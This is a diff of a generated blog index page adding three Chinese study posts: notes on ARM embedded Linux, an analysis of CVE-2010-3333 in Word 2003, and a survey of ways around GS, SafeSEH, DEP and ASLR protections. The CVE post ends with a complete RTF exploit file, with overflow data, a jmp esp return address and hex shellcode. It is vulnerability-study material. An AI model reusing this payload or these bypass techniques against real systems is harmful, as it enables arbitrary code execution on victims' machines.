-       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    <div class="article-meta">
+      <a href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/%E3%80%8AARM%E5%B5%8C%E5%85%A5%E5%BC%8FLinux%E7%B3%BB%E7%BB%9F%E5%BC%80%E5%8F%91%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/" class="article-date">
+  	<time datetime="2022-08-09T03:21:41.844Z" itemprop="datePublished">2022-08-09</time>
+</a>
     </div>
   
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/%E3%80%8AARM%E5%B5%8C%E5%85%A5%E5%BC%8FLinux%E7%B3%BB%E7%BB%9F%E5%BC%80%E5%8F%91%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/">
+        《ARM嵌入式Linux系统开发详解》学习笔记1
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="0x01-嵌入式系统入门"><a href="#0x01-嵌入式系统入门" class="headerlink" title="0x01 嵌入式系统入门"></a>0x01 嵌入式系统入门</h1><p><b>什么是嵌入式系统：</b></p>
+<p>一种为特定设备服务的，软件硬件可裁剪的计算机系统，形式变化多样、体积小。如手机、微波炉，对于手机、微波炉来说，需要小型计算机来控制，换句话，是需要把计算机全入到手机和微波炉里，也就是嵌入式系统，不需要严格地响应时间和数据吞吐量，最关键的是能够缩小体积以及功能专门化，嵌入式系统种类繁多，按照系统硬件的核心处理器来说可以分成嵌入式微控制器和嵌入式微处理器。</p>
+<p><b>嵌入式微控制器：</b></p>
+<p>嵌入式微控制器也就是传统意义上的单片机，是目前嵌入式系统的前身。单片机就是把一个计算机的主要功能集成到一个芯片上，即一个芯片就是一个计算机，体积小、结构简单、便于开发以及价格经济。</p>
+<p>通常一个单片机芯片包含运算处理单元、ARM、Flash存储器以及外部接口，通过外部接口可以输出或者输入心寒，控制相应的设备，用户可以把编写好的代码烧写到单片机芯片内部来控制外部设备。</p>
+<p><b>嵌入式微处理器：</b></p>
+<p>单片机处理能力低，嵌入式微处理器是最近几年随着大规模集成电路发展同步，处理能力更强，目前主流嵌入式微处理器都是32位，而单片机多是8位和16位。</p>
+<p><b>典型嵌入式系统组成：</b></p>
+<p>嵌入式系统与传统PC一样，也是一种及计算机系统，由硬件和软件组成，硬件包括嵌入式微控制器和微处理器，以及一些外围元器件和外部设备；软件包括嵌入式操作系统和应用软件。</p>
+<p>嵌入式系统种类繁多，不同的嵌入式系统软、硬件很难兼容，软件必须修改而硬件必须重新设计才能使用。</p>
+<p>典型嵌入式系统:</p>
+<ul>
+<li>硬件：<ul>
+<li>嵌入式处理器：处理器是整个系统的核心，负责处理所有的软件程序以及外部设备的信号</li>
+<li>外部设备：在不同系统中有不同选择。</li>
+</ul>
+</li>
+<li>软件：<ul>
+<li>嵌入式操作系统：是软硬件的接口，负责管理系统的所有软件和硬件资源，还可以通过驱动程序与外部设备打交道。</li>
+<li>应用软件：利用操作系统提供的功能开发出针对某个需求的程序，供用户使用。</li>
+</ul>
+</li>
+</ul>
+<h1 id="0x02-嵌入式软硬件系统"><a href="#0x02-嵌入式软硬件系统" class="headerlink" title="0x02 嵌入式软硬件系统"></a>0x02 嵌入式软硬件系统</h1><p>数字电路是计算机的基础。</p>
+<p>进制转换</p>
+<p>计算机组成原理</p>
+<p>直接内存访问：DMA</p>
+<p>软件：系统软件、应用软件</p>
+<p>软件开发：需求分析、概要设计和详细设计、编码和调试、测试和维护。</p>
+<p>常见软件开发模型：瀑布开发模型、增量开发模型、统一软件开发模型。</p>
+<p>操作系统的基本结构都是内核、驱动程序、程序库。</p>
+<h1 id="0x03-ARM处理器"><a href="#0x03-ARM处理器" class="headerlink" title="0x03 ARM处理器"></a>0x03 ARM处理器</h1><ul>
+<li>微处理器<ul>
+<li>通用微处理器：用于高性能计算</li>
+<li>嵌入式微处理器：针对某种特定应用的高能力计算</li>
+<li>微控制器：用于控制某种设备，通常集成了多种外部设备控制器，处理指令能力不强但价格低廉。</li>
+</ul>
+</li>
+</ul>
+<p>ARM:高性能RISC机器。</p>
+<ul>
+<li>芯片体积小，功耗低，成本低性能优异</li>
+<li>支持Thumb(16位)和ARM(32位)</li>
+<li>内部大量使用寄存器，执行指令速度快。</li>
+<li>大部分指令是操作寄存器，很少访问外部内存</li>
+<li>采用多级流水线结构处理速度快。</li>
+<li>多种寻址方式，数据存取方式灵活</li>
+<li>指令长度固定，便于编译器操作以及执行指令</li>
+</ul>
+<h3 id="ARM指令集"><a href="#ARM指令集" class="headerlink" title="ARM指令集"></a>ARM指令集</h3><ul>
+<li>算术运算指令<ul>
+<li>ADD:加法运算<ul>
+<li>add dest,op1,op2 //dest是目的寄存器，op1 op2是操作数,dest=op1+op2</li>
+</ul>
+</li>
+<li>ADC:带进位加法<ul>
+<li>ADC dest,op1,op2</li>
+</ul>
+</li>
+<li>SUB:减法<ul>
+<li>sub dest,op1,op2</li>
+<li>dest=op1-op2</li>
+</ul>
+</li>
+<li>SBC：带进位减法</li>
+</ul>
+</li>
+<li>逻辑运算指令<ul>
+<li>AND:逻辑与(1 1为1，0 0为1，1 0为0)<ul>
+<li>and dest,op1,op2</li>
+<li>dest=op1 and op2</li>
+</ul>
+</li>
+<li>EOR:异或（1 1为0，0 0为0，10为1）</li>
+<li>MOV:复制数据<ul>
+<li>mov dest,op1</li>
+<li>dest=op1</li>
+<li>mov r0,r0,LSL#3//r0=r0*8,LSL寄存器左移三位，即乘以8</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>分支指令<ul>
+<li>B:跳转<ul>
+<li>b 地址 //跳转到指定地址</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>数据传送指令<ul>
+<li>单一数据传送指令：向内存装载和存储一个字节或一个字长的数据<ul>
+<li>LDR Rd,地址</li>
+<li>STR Rd,地址</li>
+<li>LDR B Rd,地址</li>
+<li>STR B Rd,地址</li>
+</ul>
+</li>
+<li>多数据传送指令：向内存装载和存储多个字节或字的数据<ul>
+<li>xxM Rn(!),&lt;寄存器列表&gt;{^}</li>
+<li>xx:LD–装载，ST–存储</li>
+<li>LDMED LDMIB//++i</li>
+<li>LDMFD LDMIA//i++</li>
+<li>LDMEA LDMDB//++*i</li>
+<li>LDMFA LDMDA//*i++</li>
+<li>STMFA STMIB//存储前增加地址</li>
+<li>STMEA STMIA//存储后增加地址</li>
+<li>STMFD STMDB//存储前增加值</li>
+<li>STMED STMDA//存储后增加值</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>ARM状态：0位表示ARM状态，1位表示Thumb状态,BX指令切换状态。</p>
+<p>MMU:内存管理单元。</p>
+<blockquote>
+<p>LSL:逻辑左移，二进制从右往左移动，空位补0（就是原数值乘以2的移位次方）<br>LSR:逻辑右移，二进制从左往右，空位补0<br>ASR:算术右移，符号位不变，高位空出补0，低位补1<br>ROR:循环右移，低位移到高位<br>RRX:带扩展的循环右移：操作数右移一位，高端空出位用原C标志值填充</p>
+</blockquote>
+<h3 id="寻址方式"><a href="#寻址方式" class="headerlink" title="寻址方式"></a>寻址方式</h3><ul>
+<li>立即寻址:用#表示数值<ul>
+<li>subs r0,#1;r0=r0-1</li>
+<li>mov r0,#0xff00;r0=0xff00</li>
+</ul>
+</li>
+<li>寄存器寻址方式：读取寄存器得到操作数<ul>
+<li>mov r1,r2;r1=r2</li>
+<li>sub r0,r1,r2;r0=r1-r2</li>
+</ul>
+</li>
+<li>寄存器偏移寻址：寄存器的值移位得结果<ul>
+<li>mov r0,r1,LSL #3;r0=r1*8</li>
+<li>ands r0,r2,LSL #3;r0= r2*8 and r1</li>
+</ul>
+</li>
+<li>寄存器间接寻址：寄存器为地址，从对应内存重取出数据<ul>
+<li>LDR r0,[r1];r1为地址，从内存中取出数据存入r0</li>
+<li>SWP r0,r0,[r1];r1为地址，从内存中取出数据与r0交换</li>
+</ul>
+</li>
+<li>基址寻址：把寄存器内容与指定便宜相加，得数据地址，后从内存中取出数据<ul>
+<li>LDR r0,[r1,#0xf];r1数值与0xf相加得到数据地址</li>
+<li>STR r0,[r1,#-2];r1数值-2得到数据地址</li>
+</ul>
+</li>
+<li>多寄存器寻址：一次传输多个寄存器值<ul>
+<li>LDMIA r1!,{r2<del>r7,r12};r1单元重数据读到r2</del>r7和r12,r1指定地址自动加1</li>
+</ul>
+</li>
+<li>栈寻址：先进后出，通过栈指针寄存器寻址<ul>
+<li>STMFD SP!,{R0<del>R7,LR};r0</del>r7和LR的内容压入堆栈</li>
+<li>LDMFD SP!,{r0<del>r7,LR};从堆栈中取出数据到r0</del>r7和LR</li>
+</ul>
+</li>
+</ul>
+<h1 id="0x04-嵌入式Linux"><a href="#0x04-嵌入式Linux" class="headerlink" title="0x04 嵌入式Linux"></a>0x04 嵌入式Linux</h1><p>一般来说，嵌入式操作系统是由启动程序、核心、根文件系统组成，通过特殊的烧录工具将编译好的嵌入式系统文件影像烧写到目标板的只读存储器（ROM）或Flash存储器中。</p>
+<h1 id="0x05-建立软件开发环境"><a href="#0x05-建立软件开发环境" class="headerlink" title="0x05 建立软件开发环境"></a>0x05 建立软件开发环境</h1><ul>
+<li>运行在windows平台下得到Linux系统模拟环境：Cygwin.</li>
+<li>linux下：串口工具minicom</li>
+<li>windows下：串口工具xshell</li>
+<li>ARM集成开发环境ADS<ul>
+<li>c语言编译器armcc</li>
+<li>c++语言编译器armcpp</li>
+</ul>
+</li>
+</ul>
+<h1 id="0x06-第一个linux应用程序"><a href="#0x06-第一个linux应用程序" class="headerlink" title="0x06 第一个linux应用程序"></a>0x06 第一个linux应用程序</h1><ul>
+<li>vi创建源代码文件hello.c</li>
+<li>gcc -c hello.c 编译运行</li>
+</ul>
+<h1 id="0x07-Linux应用程序编程基础"><a href="#0x07-Linux应用程序编程基础" class="headerlink" title="0x07 Linux应用程序编程基础"></a>0x07 Linux应用程序编程基础</h1><ul>
+<li>堆栈</li>
+<li>内存管理函数<ul>
+<li>malloc():分配内存，不能初始化内存空间</li>
+<li>free()：释放malloc()分配的内存</li>
+</ul>
+</li>
+<li>实用的内存分配函数<ul>
+<li>calloc():分配一块新内存，向应用程序分诶内存，分配后会初始化新分配的内存空间</li>
+<li>realloc():改变一块已经分配的内存大小，函数调整后的内存空间起始地址有可能与原来的不同，所以需要realloc()函数的返回值。</li>
+</ul>
+</li>
+<li>文件指针和流：FILE*fp</li>
+<li>getc() /fgetc() /getchar()</li>
+<li>POSIX文件I/O编程<ul>
+<li>POSIX可移植操作系统接口</li>
+<li>open() /creat() /close() /read() /write() /fcnt()修改一打开文件属性</li>
+<li>文件头：<ul>
+<li>&lt;sys/types.h&gt;</li>
+<li>&lt;sys/stat.h&gt;</li>
+<li>&lt;fcntl.h&gt;</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h1 id="0x08-开发多进程-x2F-线程程序"><a href="#0x08-开发多进程-x2F-线程程序" class="headerlink" title="0x08 开发多进程/线程程序"></a>0x08 开发多进程/线程程序</h1><ul>
+<li>PCB进程控制块</li>
+<li>fork()调用创建进程</li>
+<li>退出进程：exit()、_exit()、atexit()、on_exit().</li>
+<li>常用进程间通信方法：<ul>
+<li>管道：单方向传送数据，只能在有共同父进程的进程间使用<ul>
+<li>pipe()函数：创建管道</li>
+<li>#include&lt;unistd.h&gt; int pipe(int filedes[1]);</li>
+</ul>
+</li>
+<li>共享内存：不同进程可访问<ul>
+<li>int shmget():创建</li>
+<li>void *shmat：获得一个共享内存ID对应的内存其实地址</li>
+<li>int shmdt：从程序中分立一块共享内存</li>
+</ul>
+</li>
+<li>FIFO</li>
+<li>消息队列</li>
+<li>信号量</li>
+<li>共享存储</li>
+<li>socker</li>
+</ul>
+</li>
+<li>Linux的多进程和多线程</li>
+</ul>
+<h1 id="0x09-网络通信应用"><a href="#0x09-网络通信应用" class="headerlink" title="0x09 网络通信应用"></a>0x09 网络通信应用</h1><ul>
+<li>TCP/IP协议簇</li>
+</ul>
+<p><img src="https://i.loli.net/2020/09/07/REugKvzkfIn7B58.png" alt="捕获.PNG"></p>
+<ul>
+<li>IP协议：在传输层，负责数据包的传输管理<ul>
+<li>实现两个功能：寻址和分段</li>
+</ul>
+</li>
+</ul>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/SinkyQ/SinkyQ.github.io.git/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag">学习笔记</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-漏洞战争学习笔记2：CVE-2010-3333" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02%EF%BC%9ACVE-2010-3333/" class="article-date">
+  	<time datetime="2022-08-09T03:17:04.198Z" itemprop="datePublished">2022-08-09</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02%EF%BC%9ACVE-2010-3333/">
+        漏洞战争学习笔记2：CVE-2010-3333
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="0x01-分析环境"><a href="#0x01-分析环境" class="headerlink" title="0x01 分析环境"></a>0x01 分析环境</h2><p>os:由于笔者实在没有找到大佬们使用的目标文件office word 2003 11.5604.5606,只有11.8169.8172，但是应该只要是2003 sp3的应该就问题不大。</p>
+<p>操作系统：windows XP SP3<br>虚拟机：VM<br>调试器：WinDbg、OD、IDA<br>office:office word 2003 11.8169.8172</p>
+<h2 id="0x02-漏洞描述"><a href="#0x02-漏洞描述" class="headerlink" title="0x02 漏洞描述"></a>0x02 漏洞描述</h2><p>oddice xp sp3、2003 sp3、2007 sp2、2010等多个版本的office软件中的Open XML文件格式转换器存在栈溢出漏洞，主要是在处理RTF的”pFragments”属性时存在栈溢出，导致远程攻击者可以借助特制的RTF数据执行任意代码，因此该漏洞又名”RTF栈缓冲区溢出漏洞”。</p>
+<p>office word 2003中的MSO.dll库在解析RTF文档的绘图pFRagments属性时完全信任其数据，未做任何检查便将数据复制到栈中，存在了栈溢出的可能，导致用户打开精心构造的RTF文件时就有可能导致执行任意代码。</p>
+<h2 id="0x03-分析过程"><a href="#0x03-分析过程" class="headerlink" title="0x03 分析过程"></a>0x03 分析过程</h2><p>用Metasploit生成测试样本msf.rtf。</p>
+<p><img src="https://i.loli.net/2020/07/31/GPUKdY8nFfENx5y.png" alt="生成msf.PNG"></p>
+<p>运行WinDbg附加Word 2003，但是每次都是还没有打开测试样本的时候，windbg就已经报错了，我裂开了呀。然后看报错是ntdll.dll文件符号文件无法找到，那我下载一个弄，结果并没有缺失，我又裂开了！</p>
+<p><img src="https://i.loli.net/2020/07/31/ilXRZynC2UDtJ9T.png" alt="裂开.PNG"></p>
+<p>[待续]</p>
+<p>打开测试样本，WinDbg捕获异常，循环赋值内存数据到栈空间时，未检测复制的内存大小，导致覆盖到edi（0x130000）开始的不可写页面,触发异常的指令位于30e9eb88,当前栈已被样本生成的垃圾数据覆盖。</p>
+<ul>
+<li>g</li>
+<li>kb</li>
+</ul>
+<p>在30e9eb88处下断，重新打开测试样本，断下来后通过kb指令得到的信息进行回溯，<br>结合IDA，可知调用函数及其执行流程：30f4cc5d-&gt;30f4cc93 call 30e9eb62-&gt;30e9eb88</p>
+<p>通过跟踪分析可发现，复制的数据大小由样本中的某一处决定，如下面两张图，前面的4在后面的计算中会变成0，并且将c8ac除以4（因为操作的大小为DWORD</p>
+<ul>
+<li>p</li>
+</ul>
+<p>为了确定该栈溢出漏洞能劫持程序运行流程，自己构造一个长度偏小（防止触发访问异常）但又能覆盖返回地址的测试样本, 打开该样本，WinDbg捕获异常，eip已被改为111111，至此我们可以确定该栈溢出漏洞可被利用</p>
+<h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04 漏洞利用"></a>0x04 漏洞利用</h2><h3 id="覆盖返回地址"><a href="#覆盖返回地址" class="headerlink" title="覆盖返回地址"></a>覆盖返回地址</h3><p>找到覆盖成返回地址的地方，修改成0x7ffa4512（jmp esp），再在后面添加一些0x90，然后运行起来还没到执行到栈中就会崩溃，推测前面测试样本太小没怎么污染到栈空间，一开始还想着还原栈空间，但是重新分析了测试样本后发现其在下图中30F4CB29处是实现跳转的，而加了一些0x90后不跳转，并进行了一些与栈相关的操作，从而导致崩溃</p>
+<h3 id="布置shellcode"><a href="#布置shellcode" class="headerlink" title="布置shellcode"></a>布置shellcode</h3><p>分析了下，是栈中多了一些0x90导致原来的一堆00不见了，所以需要在返回地址后面加40个00，这样就可以执行到栈中了。在后面加入shellcode，重新运行并成功进入shellcode，<br>布置shellcode如下：</p>
+<p>z<br>{\rtf1{}{\shp{*\shpinst{\sp{\sn pfragments}{\sv1;1;11111111111111111111111111111111111111111111111111111245fa7f0000000000000000000000000000000000000000fc686a0a381e686389d14f683274910c8bf48d7ef433dbb7042be366bb33325368757365725433d2648b5a308b4b0c8b491c8b098b6908ad3d6a0a381e750595ff57f895608b453c8b4c057803cd8b592003dd33ff478b34bb03f5990fbe063ac47408c1ca0703d046ebf13b54241c75e48b592403dd668b3c7b8b591c03dd032cbb955fab57613d6a0a381e75a933db536875730000687267656f68524e476f8bc453505053ff57fc53ff57f8}}}}}<br>```</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/SinkyQ/SinkyQ.github.io.git/tags/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89/" rel="tag">漏洞战争</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-类型漏洞合集" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/" class="article-date">
+  	<time datetime="2022-08-09T03:17:04.198Z" itemprop="datePublished">2022-08-09</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/">
+        各类型软件漏洞合集
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="0x01-格式化串漏洞"><a href="#0x01-格式化串漏洞" class="headerlink" title="0x01 格式化串漏洞"></a>0x01 格式化串漏洞</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>格式化串漏洞产生于数据输出函数中对输出格式解析的缺陷。当输入输出函数的格式控制符能够被外界影响时，攻击者可以利用读写内存的方法修改函数返回地址，劫持进程，使shellcoed得到执行。</p>
+<p>此类漏洞发生条件苛刻，实际案例很少。</p>
+<h2 id="能够引起此漏洞的函数"><a href="#能够引起此漏洞的函数" class="headerlink" title="能够引起此漏洞的函数"></a>能够引起此漏洞的函数</h2><pre><code>int printf(const char* format [,argument]...);
+int wprintf(const wchar_t* format [,argument]...);
+int fwprintf(FILE* stream,const wchar_t* format [,argument]...);
+int sprintf(char buffer,const char* format [,argument]...);
+int swprintf(wchar_t *buffer,const wchar_t *format [,argument]...);
+int vprintf(const char* format,va_list argptr );
+int vwprintf(const wchar_t* format,va_list argptr );
+int vfprintf(FILE *stream,const char* format,va_list argptr );
+int vfwprintf(FILE *stream,const wchar_t* format,va_list argptr );
+int vsprintf(char *buffer,const char* format,va_list argptr );
+int vswprintf(wchar_t *buffer,const wchar_t* format,va_list argptr );
+</code></pre>
+<h1 id="0x02-GS安全编译选项保护"><a href="#0x02-GS安全编译选项保护" class="headerlink" title="0x02 GS安全编译选项保护"></a>0x02 GS安全编译选项保护</h1><h2 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h2><p>在所有函数调用发生时，GS编译选项会向栈帧内压入一个额外的随机DWORD,这个随机数被称为canary，在EBP前，系统在.data内存区存放了canary副本，函数返回前系统会执行安全验证操作，比较栈帧中canary与内存区副本是否一致，不一致则证明发生溢出，系统将进行异常处理。</p>
+<h2 id="以下情况不会应用GS"><a href="#以下情况不会应用GS" class="headerlink" title="以下情况不会应用GS"></a>以下情况不会应用GS</h2><ul>
+<li>函数不包含缓冲区</li>
+<li>函数被定义为具有变量参数列表</li>
+<li>函数使用无保护的关键字标记</li>
+<li>函数在第一个语句中包含内嵌汇编代码</li>
+<li>缓冲区不是8字节类型且大小不大于4个字节。</li>
+</ul>
+<h2 id="典型突破GS的方法"><a href="#典型突破GS的方法" class="headerlink" title="典型突破GS的方法"></a>典型突破GS的方法</h2><h3 id="利用未保护的内存"><a href="#利用未保护的内存" class="headerlink" title="利用未保护的内存"></a>利用未保护的内存</h3><p>为了将GS对性能的影响降到最小，并不会所有的函数都会被保护，我们可以利用一些未被保护的函数绕过GS保护。</p>
+<blockquote>
+<p>例子：函数中不包含4字节以上的缓冲区，不受到GS保护，函数返回前未进行任何安全检测，可以覆盖返回地址。</p>
+</blockquote>
+<pre><code class="mov">    mov esp,ebp
+    pop ebp
+    retn```
+
+### 覆盖虚函数
+程序只有在函数返回时才会check，而在此之前没有任何检查措施，我们可以在程序检查cookie之前劫持程序流程，实现溢出。
+&gt; 例子：利用C++的虚函数来绕过GS机制。
+&gt;&gt; 当函数中存在溢出，可能会影响到虚表指针，继而可以控制虚表指针使其指向我们可以控制的内存空间。
+&gt; 虚函数实现过程：程序根据虚表指针找到虚表，然后从虚表中取出要调用的虚函数地址，根据地址转入虚函数执行。
+
+### 攻击异常处理
+GS对S.E.H没有提供保护。我们可以通过攻击异常处理绕过GS.
+
+通过超长字符串覆盖掉异常处理函数指针，想办法触发一个异常，程序就会转入异常处理，由于异常处理函数指针已经被覆盖，我们就可以通过劫持S.E.H来控制程序的后续流程。
+### 同时替换栈中和.data中的Cookie
+cookie的生成具有很强的随机性，因为才出来基本不可能。同时替换栈中和.data中的cookie保证溢出后的一致性。
+&gt; 例子：将shellcode赋值为8个0x90,OD运行断在test函数的if语句处，从if_addr取出cookie，与ebp异或后放入ebp-4的位置去。（函数返回前的校验过程：程序从ebp-4的位置取出cookie,与ebp异或后与if_addr处cookie比较一致性），如此.data中cookie成功修改为0x90.
+&gt; 接下来控制栈中cookie，通过超长字符串覆盖变量，修改cookie。
+&gt; 布置shellcode:首先放4个0x90用于修改if_addr，然后跟着弹出“failwest”的机器码，然后用0x90填充至cookie的位置，接下来跟着90909090与当前ebp异或的结果，最后再加上4个字节的填充和shellcode起始地址(用来覆盖函数返回地址)
+
+# 0x03 SafeSEH：对异常处理的保护机制
+在程序调用异常处理函数前，对要调用的异常处理函数进行校验，当发现函数不可靠将终止异常处理函数的调用。
+## 校验流程
+异常处理函数的调用是通过RtlDispatchException()函数处理实现，SafeSEH机制也是从此处开始。其校验流程如下：
+
+* 检查异常处理链是否位于当前程序的栈中
+* 异常处理指针是否指向当前程序栈中
+* 调用函数RtlIsVaildHandler()对异常处理函数进行校验
+    * 异常处理函数地址是否在加载模块的内存空间
+    * 判断程序是否设置了IMAGE_DLLCHARACTERISTICS_NO_SEH标识（标识被设置，函数返回校验失败）
+    * 程序中是否包含安全S.E.H表，将异常处理函数地址与该表匹配，成功则继续
+    * 判断是否设置ILonly标识。（设置此标识，证明该程序只包含.NET编译人中间语言，校验失败）
+    * 判断异常处理函数地址是否位于不可执行页上，位于，则检测DEP是否开启，未开启则校验成功
+    * 判断系统是否允许跳转到加载模块的内存空间外执行，允许则返回成功
+
+&gt; RtlIsVaildHandler()允许异常处理函数执行的情况：
+&gt;&gt; 异常处理函数位于加载模块内存范围之外，DEP关闭
+&gt;&gt; 异常处理函数位于加载模块内存范围之内，相应模块未启用SafeSEH，且模块不是纯IL（中间语言）.
+&gt;&gt; 异常处理函数位于加载模块内存范围之内，相应模块未启用SafeSEH，异常处理函数地址包含在安全SEH表中。
+
+## 绕过SafeSEH（不考虑DEP影响）
+* 攻击返回地址绕过。
+    * 一个程序启用了SafeSEH但是未启用GS(或被攻击函数不受到GS保护)，攻击函数返回地址
+* 利用虚函数绕过
+* 从堆中绕过
+* 利用未启用SafeSEH模块绕过
+* 利用加载模块之外的地址绕过SafeSEH
+* 
+
+# 0x04 DEP
+## 介绍
+溢出攻击的根源在于现代计算机对数据和代码没有明确区分这一先天缺陷，DEP(数据执行保护)就是用来弥补计算机对数据和代码混淆这一天然缺陷。
+
+DEP基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。
+
+DEP主要作用是阻止数据页执行代码，分为软件DEP和硬件DEP.
+
+软件DEP即SafeSEH，与CPU硬件无关。
+
+硬件DEP是由Windows利用软件模拟实现，对操作系统提供一定的保护。（硬件DEP才是真正的DEP,需要CPU支持，AMD称之为NX，Intel称之为XD）
+
+## 攻击DEP方法
+### 攻击未启用DEP程序
+### 利用Ret2Libc挑战DEP
+ret2libc是return-to-libc的缩写，由于DEP不允许我们直接到非可执行也执行指令，我们需要在其他可执行的位置找到符合我们要求的指令，让这条指令替我们工作，为了控制此条指令，在指令执行后还需要一个返回指令，以便回收程序的控制权。
+
+#### 三种相对有效的绕过DEP的exploit方法
+* 通过跳转到ZwSetInformationProcess函数将DEP关闭后再转入shellcode执行
+* 通过跳转到VirtualProtect函数来将shellcode所在内存页设置为可执行状态，然后在转入shellcode执行
+* 通过跳转到VIrtualAlloc函数开辟一段具有执行权限的内存空间建，然后将shellcode复制到这段内存中执行
+
+### 利用可执行内存挑战DEP
+有时候在进程的内存空间中会存在一段可读可写可执行的内存，如果能够将shellcode复制到这段内存中，并劫持程序流程，我们的shellcode就有执行的机会。此处需要一些运气，然而我在做实验上一向运气很差……,如果被攻击的程序内存空间中存在这样一个可执行的数据区域，就可以直接通过memcpy函数将shellcode复制到这段内存区域中执行。
+### 利用.NET挑战DEP
+.NET的文件具有和PE文件一样的结构，即也具有.text等段，这些段会被映射到内存中，也会具有一定的可执行属性。将shellcode放到.NET中具有可执行属性的段中，然后让程序转入这个区域执行，就可以执行shellcode了。
+### 利用java applet挑战DEP
+java applet与.NET类似，都可以被IE浏览器加载到客户端，而且加载到IE进程的内存空间后这些控件所在内存空间都具有可执行属性。
+
+# 0x05 ASLR
+## 介绍
+ASLR,通过加载程序的时候不再使用固定的基址加载，从而干扰shellcode定位的一种保护机制。包含了映像随机化、堆栈随机化、PEB与TEB随机化。
+
+（支持ASLR的程序在它的PE头中会设置IMAGE_DLL_CHARACTERISITCS_DYNAMIC_BASE标识来说明，编译程序时启用/dynmicbase链接选项就可以支持ASLR了）
+
+### 映像随机化
+在PE文件映射到内存中，对其加载的虚拟地址进行随机化处理，这个地址是在系统启动时确定的，系统重启红藕这个地址会变化。
+
+映像随机化只对加载基址的前2个字节做了随机处理。
+### 堆栈随机化
+在程序运行时随机的选择堆栈基址，堆栈基址在打开程序的时候确定。
+### PEB和TEB随机化
+TEB存放在FS:0和FS:[0x18]处，PEB存放在TEB偏移0x30的位置。
+## 攻击方式
+### 攻击未启用ASLR模块
+ASLR仅仅是安全机制，不支持ASLR的软件很多，这意味着加载基址固定，在当前进程找到这样的模块就可以利用它里面的指令作为跳板直接无视ASLR.
+
+如：Adobe Flash Player ActiveX
+### 利用部分覆盖进行定位内存地址
+之前说过，映像随机化只是对映像加载基址的前2个字节做随机化处理，我们可覆盖这个地址的最后几个固定字节，就可以在一定范围内控制程序。
+采用这种类似相对寻址方法来动态确定跳板指令的地址以实现调班指令的通用性。
+### 利用Heap spray技术定位内存地址
+Heap spray原理：通过申请大量的内存，占领内存中的0x0C0C0C0C的位置，并在这些内存中放置0x90和shellcode，最后控制程序转入0x0C0C0C0C执行。
+### 利用Java applet heap spray技术定位内存地址
+### 为.NET控件禁用ASLR
+</code></pre>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/SinkyQ/SinkyQ.github.io.git/tags/%E6%BC%8F%E6%B4%9E/" rel="tag">漏洞</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
